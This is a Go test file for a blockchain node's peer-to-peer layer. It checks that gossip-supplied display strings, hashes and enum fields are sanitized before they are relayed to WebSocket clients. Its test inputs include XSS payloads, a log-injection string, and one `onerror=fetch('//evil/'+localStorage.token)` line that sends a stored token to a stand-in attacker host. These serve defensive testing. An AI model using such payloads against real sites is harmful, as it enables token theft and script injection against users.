package p2p

import (
	"context"
	"encoding/json"
	"reflect"
	"strings"
	"testing"

	"github.com/bsv-blockchain/teranode/model"
	"github.com/bsv-blockchain/teranode/services/blockchain"
	"github.com/bsv-blockchain/teranode/services/blockchain/blockchain_api"
	"github.com/bsv-blockchain/teranode/settings"
	"github.com/stretchr/testify/mock"
	"github.com/stretchr/testify/require"
)

func TestSanitizePeerDisplayString(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"empty stays empty", "", ""},
		{"realistic client name survives", "client/1.0", "client/1.0"},
		{"realistic version survives", "v1.2.3-rc.1+build.7", "v1.2.3-rc.1+build.7"},
		{"realistic miner name survives", "TeraNode Miner 1", "TeraNode Miner 1"},
		{"strips markup characters", "<img src=x onerror=alert(1)>", "img src=x onerror=alert(1)"},
		{"strips quotes and backticks", `a"b'c` + "`d", "abcd"},
		{"strips ampersand and angle bracket, keeps the rest", "a&lt;b", "alt;b"},
		{"strips control characters", "a\x00b\x1bc", "abc"},
		{"strips newlines (log injection)", "ok\nlevel=fatal msg=pwned", "oklevel=fatal msg=pwned"},
		{"strips non-ascii letters", "teran\u00f8de", "terande"},
		// U+202E RIGHT-TO-LEFT OVERRIDE. Written as an escape rather than the
		// literal character so this file stays pure ASCII: a bidi control in
		// source renders differently from how it executes.
		{"strips bidi override", "teranode\u202e" + "en", "teranodeen"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			require.Equal(t, tt.want, sanitizePeerDisplayString(tt.input, maxPeerDisplayStringLen))
		})
	}
}

func TestSanitizePeerDisplayString_Truncates(t *testing.T) {
	got := sanitizePeerDisplayString(strings.Repeat("a", 10_000), maxPeerDisplayStringLen)
	require.Len(t, got, maxPeerDisplayStringLen)

	// Stripped characters must not consume budget, so a long hostile prefix
	// cannot push legitimate content out of the result.
	got = sanitizePeerDisplayString(strings.Repeat("<", 10_000)+"teranode", maxPeerDisplayStringLen)
	require.Equal(t, "teranode", got)
}

func TestSanitizePeerHexString(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"empty stays empty", "", ""},
		{"lowercase hex survives", "00000000000000000000000000000000000000000000010fdd15e64b0d0e07dc", "00000000000000000000000000000000000000000000010fdd15e64b0d0e07dc"},
		{"uppercase hex survives", "DEADBEEF", "DEADBEEF"},
		{"0x prefix rejected", "0xdeadbeef", ""},
		{"markup rejected", "<script>", ""},
		{"partially hex rejected outright", "dead<beef", ""},
		{"exactly max length accepted", strings.Repeat("a", maxPeerHexStringLen), strings.Repeat("a", maxPeerHexStringLen)},
		{"over-length rejected", strings.Repeat("a", maxPeerHexStringLen+1), ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			require.Equal(t, tt.want, sanitizePeerHexString(tt.input, maxPeerHexStringLen))
		})
	}
}

func TestSanitizePeerEnum(t *testing.T) {
	require.Equal(t, storageModeFull, sanitizePeerEnum("full", storageModeFull, storageModePruned))
	require.Equal(t, storageModePruned, sanitizePeerEnum("pruned", storageModeFull, storageModePruned))
	require.Empty(t, sanitizePeerEnum("<img src=x>", storageModeFull, storageModePruned))
	require.Empty(t, sanitizePeerEnum("Full", storageModeFull, storageModePruned), "enum match is exact")
	require.Empty(t, sanitizePeerEnum("", storageModeFull, storageModePruned))
}

// TestSanitizeNodeStatusMessage_PreservesHonestValues guards against the
// sanitizer being tightened to the point where a well-behaved node's own
// status would be mangled.
func TestSanitizeNodeStatusMessage_PreservesHonestValues(t *testing.T) {
	listenModes := []string{settings.ListenModeFull, settings.ListenModeListenOnly, settings.ListenModeSilent}
	storageModes := []string{storageModeFull, storageModePruned}

	for _, listenMode := range listenModes {
		for _, storage := range storageModes {
			msg := &NodeStatusMessage{
				Version:    "v1.2.3",
				CommitHash: "a1b2c3d4-dirty",
				ClientName: "client/1.0",
				// The genesis coinbase tag, the longest miner name in practice.
				MinerName:         "The Times 03/Jan/2009 Chancellor on brink of second bailout for banks",
				FSMState:          "RUNNING",
				SyncPeerID:        "16Uiu2HAmSyncPeer",
				ChainWork:         "00000000000000000000000000000000000000000000010fdd15e64b0d0e07dc",
				BestBlockHash:     "000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f",
				SyncPeerBlockHash: "000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f",
				ListenMode:        listenMode,
				Storage:           storage,
			}
			want := *msg

			sanitizeNodeStatusMessage(msg)

			require.Equal(t, want, *msg, "listen_mode=%s storage=%s", listenMode, storage)
		}
	}
}

func TestSanitizeNodeStatusMessage_StripsHostileValues(t *testing.T) {
	const payload = `<img src=x onerror=fetch('//evil/'+localStorage.token)>`

	msg := &NodeStatusMessage{
		Version:           payload,
		CommitHash:        payload,
		ClientName:        payload,
		MinerName:         payload,
		FSMState:          payload,
		SyncPeerID:        payload,
		ChainWork:         payload,
		SyncPeerBlockHash: payload,
		ListenMode:        payload,
		Storage:           payload,
	}

	sanitizeNodeStatusMessage(msg)

	// Hex and enum fields are all-or-nothing.
	require.Empty(t, msg.ChainWork)
	require.Empty(t, msg.SyncPeerBlockHash)
	require.Empty(t, msg.ListenMode)
	require.Empty(t, msg.Storage)

	// Free-form fields keep their harmless characters but lose all markup.
	for _, got := range []string{msg.Version, msg.CommitHash, msg.ClientName, msg.MinerName, msg.FSMState, msg.SyncPeerID} {
		require.NotContains(t, got, "<")
		require.NotContains(t, got, ">")
		require.NotContains(t, got, "'")
		require.LessOrEqual(t, len(got), maxPeerDisplayStringLen)
	}
}

// TestSanitizeNodeStatusMessage_CoversEveryStringField fails when a string
// field is added to NodeStatusMessage without a decision being made about it.
// Missing BestBlockHash was exactly this kind of oversight.
func TestSanitizeNodeStatusMessage_CoversEveryStringField(t *testing.T) {
	// Fields deliberately relayed as received; see sanitizeNodeStatusMessage.
	exempt := map[string]string{
		"PeerID":         "pinned to the sender's libp2p identity by the anti-spoofing check",
		"BaseURL":        "validated separately (SSRF + operator blacklist)",
		"PropagationURL": "never read off a received message",
		"Type":           "compared against a literal, never displayed",
		"BestBlockHash":  "bounded by handleNodeStatusTopic itself, so sanitizeAdvertisedTip still sees the raw value (see TestHandleNodeStatusTopic_SanitizesTipWithoutHeight)",
	}

	const marker = `<img src=x onerror=alert(1)>`

	msg := &NodeStatusMessage{}
	v := reflect.ValueOf(msg).Elem()

	for i := 0; i < v.NumField(); i++ {
		if v.Field(i).Kind() == reflect.String {
			v.Field(i).SetString(marker)
		}
	}

	sanitizeNodeStatusMessage(msg)

	for i := 0; i < v.NumField(); i++ {
		field := v.Type().Field(i)
		if v.Field(i).Kind() != reflect.String {
			continue
		}

		if reason, ok := exempt[field.Name]; ok {
			require.Equal(t, marker, v.Field(i).String(),
				"%s is exempt (%s) but was modified - update the exemption list", field.Name, reason)
			continue
		}

		require.NotEqual(t, marker, v.Field(i).String(),
			"NodeStatusMessage.%s is relayed to WebSocket clients unsanitized; add it to sanitizeNodeStatusMessage or to the exemption list above", field.Name)
	}
}

// TestHandleNodeStatusTopic_SanitizesPeerStrings is the end-to-end guard: a
// hostile gossip message must not reach WebSocket subscribers or the peer
// registry with its markup intact.
func TestHandleNodeStatusTopic_SanitizesPeerStrings(t *testing.T) {
	s, reg := newServerWithLocalRegistry(t)
	setServerLocalHeight(t, s, 100)

	self := mustNewPeerID(t)
	mockP2P := new(MockServerP2PClient)
	mockP2P.peerID = self
	s.P2PClient = mockP2P
	s.notificationCh = make(chan *notificationMsg, 1)

	remote := mustNewPeerID(t)
	const (
		blockHash = "000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f"
		payload   = `<img src=x onerror=fetch('//evil/'+localStorage.token)>`
	)

	msgBytes, err := json.Marshal(NodeStatusMessage{
		PeerID:        remote.String(),
		BestHeight:    101,
		BestBlockHash: blockHash,
		Version:       payload,
		CommitHash:    payload,
		ClientName:    payload,
		MinerName:     payload,
		FSMState:      payload,
		ListenMode:    payload,
		ChainWork:     payload,
		Storage:       payload,
	})
	require.NoError(t, err)

	s.handleNodeStatusTopic(context.Background(), msgBytes, remote.String())

	select {
	case notification := <-s.notificationCh:
		for name, got := range map[string]string{
			"version":     notification.Version,
			"commit_hash": notification.CommitHash,
			"client_name": notification.ClientName,
			"miner_name":  notification.MinerName,
			"fsm_state":   notification.FSMState,
		} {
			require.NotContains(t, got, "<", "%s reached WebSocket clients with markup", name)
			require.NotContains(t, got, ">", "%s reached WebSocket clients with markup", name)
		}

		require.Empty(t, notification.ChainWork, "non-hex chain_work must be dropped")
		require.Empty(t, notification.ListenMode, "unknown listen_mode must be dropped")
		require.Empty(t, notification.Storage, "unknown storage mode must be dropped")
	default:
		t.Fatal("expected node_status notification")
	}

	// An unrecognised storage mode must not be recorded at all. (ClientName is
	// deliberately not asserted here: the peer registry sanitizes it again on
	// write, so such an assertion would pass with or without this change.)
	got, ok := reg.Get(remote.String())
	require.True(t, ok)
	require.NotEqual(t, payload, got.Storage)
}

// TestHandleNodeStatusTopic_SanitizesTipWithoutHeight covers the one path where
// BestBlockHash is not replaced by a parsed hash and so reaches WebSocket
// clients as the peer wrote it.
func TestHandleNodeStatusTopic_SanitizesTipWithoutHeight(t *testing.T) {
	s, _ := newServerWithLocalRegistry(t)
	setServerLocalHeight(t, s, 100)

	self := mustNewPeerID(t)
	mockP2P := new(MockServerP2PClient)
	mockP2P.peerID = self
	s.P2PClient = mockP2P
	s.notificationCh = make(chan *notificationMsg, 1)

	remote := mustNewPeerID(t)
	msgBytes, err := json.Marshal(NodeStatusMessage{
		PeerID:        remote.String(),
		BestHeight:    0,
		BestBlockHash: `<img src=x onerror=alert(1)>`,
	})
	require.NoError(t, err)

	s.handleNodeStatusTopic(context.Background(), msgBytes, remote.String())

	select {
	case notification := <-s.notificationCh:
		require.Empty(t, notification.BestBlockHash, "non-hex best_block_hash must be dropped")
	default:
		t.Fatal("expected node_status notification")
	}
}

// TestGetNodeStatusMessage_SanitizesMinerName covers the one hostile string we
// do not receive over gossip: MinerName is extracted from the best block's
// coinbase scriptSig, so it is chosen by whoever mined the block, and it is both
// forwarded to our own WebSocket clients and published to peers.
func TestGetNodeStatusMessage_SanitizesMinerName(t *testing.T) {
	s, _ := newServerWithLocalRegistry(t)

	mockBlockchain := &blockchain.Mock{}
	mockBlockchain.On("GetBestBlockHeader", mock.Anything).Return(
		model.GenesisBlockHeader,
		&model.BlockHeaderMeta{Height: 100, Miner: `<img src=x onerror=alert(1)>`},
		nil,
	).Maybe()
	fsmState := blockchain_api.FSMStateType_RUNNING
	mockBlockchain.On("GetFSMCurrentState", mock.Anything).Return(&fsmState, nil).Maybe()
	mockBlockchain.On("GetState", mock.Anything, mock.Anything).Return([]byte{}, nil).Maybe()
	s.blockchainClient = mockBlockchain

	msg := s.getNodeStatusMessage(context.Background())
	require.NotNil(t, msg)
	require.Equal(t, "img src=x onerror=alert(1)", msg.MinerName)
}

// TestHandleSubtreeTopic_SanitizesClientName covers the third relay path.
func TestHandleSubtreeTopic_SanitizesClientName(t *testing.T) {
	s, _ := newServerWithLocalRegistry(t)
	setServerLocalHeight(t, s, 100)

	self := mustNewPeerID(t)
	mockP2P := new(MockServerP2PClient)
	mockP2P.peerID = self
	s.P2PClient = mockP2P
	s.notificationCh = make(chan *notificationMsg, 1)

	remote := mustNewPeerID(t)
	msgBytes, err := json.Marshal(SubtreeMessage{
		PeerID:     remote.String(),
		Hash:       "000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f",
		DataHubURL: "http://peer.example",
		ClientName: `<img src=x onerror=alert(1)>`,
	})
	require.NoError(t, err)

	s.handleSubtreeTopic(context.Background(), msgBytes, remote.String())

	select {
	case notification := <-s.notificationCh:
		require.NotContains(t, notification.ClientName, "<")
		require.NotContains(t, notification.ClientName, ">")
	default:
		t.Fatal("expected subtree notification")
	}
}

// TestHandleBlockTopic_SanitizesClientName covers the same relay path for the
// block topic, which forwards ClientName the same way.
func TestHandleBlockTopic_SanitizesClientName(t *testing.T) {
	s, _ := newServerWithLocalRegistry(t)
	setServerLocalHeight(t, s, 100)

	self := mustNewPeerID(t)
	mockP2P := new(MockServerP2PClient)
	mockP2P.peerID = self
	s.P2PClient = mockP2P
	s.notificationCh = make(chan *notificationMsg, 1)

	remote := mustNewPeerID(t)
	const blockHash = "000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f"

	msgBytes, err := json.Marshal(BlockMessage{
		PeerID:     remote.String(),
		Hash:       blockHash,
		Height:     101,
		DataHubURL: "http://peer.example",
		ClientName: `<img src=x onerror=alert(1)>`,
	})
	require.NoError(t, err)

	s.handleBlockTopic(context.Background(), msgBytes, remote.String())

	select {
	case notification := <-s.notificationCh:
		require.NotContains(t, notification.ClientName, "<")
		require.NotContains(t, notification.ClientName, ">")
	default:
		t.Fatal("expected block notification")
	}

}
